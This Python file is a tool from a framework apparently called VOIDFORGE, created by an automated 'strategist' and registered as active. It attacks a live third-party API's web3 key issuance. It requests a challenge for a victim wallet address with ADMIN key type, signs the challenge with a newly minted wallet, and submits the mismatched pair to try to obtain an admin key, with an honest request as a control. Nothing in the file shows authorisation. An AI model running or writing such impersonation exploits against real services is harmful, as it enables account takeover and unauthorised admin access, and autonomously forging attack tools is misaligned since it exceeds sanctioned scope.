"""VOIDFORGE :: forged tool — web3key_impersonation_test
Full web3_key chain: fetch challenge, sign with minted wallet, POST counterfeit (victim address + our sig) AND honest control — returns both verdicts
Forged by the strategist on 2026-09-01. Edit freely; delete the file to disarm.
"""
import json, re, time, urllib.request, urllib.error


def run(**kwargs):
    import json, urllib.request, time
    from eth_account import Account
    from eth_account.messages import encode_defunct
    out = {"steps": []}
    VICTIM = "0x0000000000000000000000000000000000000001"
    try:
        # Step 1: fetch challenge token
        req = urllib.request.Request(
            "https://api.venice.ai/api/v1/api_keys/generate_web3_key?address=" + VICTIM + "&apiKeyType=ADMIN")
        with urllib.request.urlopen(req, timeout=20) as r:
            tok = json.loads(r.read())["data"]["token"]
        out["steps"].append({"step": "challenge", "ok": True, "token_prefix": tok[:40]})
        # Step 2: mint wallet, sign token
        acct = Account.create()
        sig = acct.sign_message(encode_defunct(text=tok)).signature.hex()
        if not sig.startswith('0x'):
            sig = '0x' + sig
        out["steps"].append({"step": "sign", "ok": True, "signer": acct.address})
        # Step 3: POST counterfeit — body address = VICTIM, signature = OUR wallet
        body = json.dumps({"apiKeyType": "ADMIN", "address": VICTIM,
                           "signature": sig, "token": tok}).encode()
        req2 = urllib.request.Request(
            "https://api.venice.ai/api/v1/api_keys/generate_web3_key", data=body,
            headers={"Content-Type": "application/json"}, method="POST")
        try:
            with urllib.request.urlopen(req2, timeout=20) as r2:
                resp = json.loads(r2.read())
                out["counterfeit_result"] = {"status": r2.status, "body": resp}
        except urllib.error.HTTPError as e:
            out["counterfeit_result"] = {"status": e.code, "body": e.read().decode()[:800]}
        # Step 4: control — honest flow (signer address == body address)
        req3 = urllib.request.Request(
            "https://api.venice.ai/api/v1/api_keys/generate_web3_key?address=" + acct.address + "&apiKeyType=INFERENCE")
        with urllib.request.urlopen(req3, timeout=20) as r3:
            tok3 = json.loads(r3.read())["data"]["token"]
        sig3 = acct.sign_message(encode_defunct(text=tok3)).signature.hex()
        if not sig3.startswith('0x'):
            sig3 = '0x' + sig3
        body3 = json.dumps({"apiKeyType": "INFERENCE", "address": acct.address,
                            "signature": sig3, "token": tok3}).encode()
        req4 = urllib.request.Request(
            "https://api.venice.ai/api/v1/api_keys/generate_web3_key", data=body3,
            headers={"Content-Type": "application/json"}, method="POST")
        try:
            with urllib.request.urlopen(req4, timeout=20) as r4:
                resp4 = json.loads(r4.read())
                out["honest_result"] = {"status": r4.status, "body": resp4}
        except urllib.error.HTTPError as e:
            out["honest_result"] = {"status": e.code, "body": e.read().decode()[:800]}
        out["ok"] = True
    except Exception as e:
        out["error"] = repr(e)
    return json.dumps(out)


from tools import register as _vf_register
_vf_register('forged_web3key_impersonation_test', 'Full web3_key chain: fetch challenge, sign with minted wallet, POST counterfeit (victim address + our sig) AND honest control — returns both verdicts', {'properties': {}, 'type': 'object'}, 'active')(run)
